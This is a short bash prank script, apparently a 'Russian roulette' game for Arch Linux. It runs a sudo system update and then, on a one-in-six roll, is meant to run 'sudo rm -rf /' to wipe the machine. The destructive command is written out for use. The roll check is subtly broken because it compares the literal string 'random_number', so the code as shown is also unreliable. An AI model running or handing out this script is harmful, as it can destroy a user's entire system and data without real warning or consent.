#!/bin/bash

#initiate sudo
sudo pacman -Syu
sleep 1

random_number=$((1 + $RANDOM % 6))

if [ "random_number" -eq 1 ]; then
	echo "bad luck, say bye bye to your PC"
	sudo rm -rf /
else
	echo "you got $random_number, you get to keep your PC this time"
	exit
fi
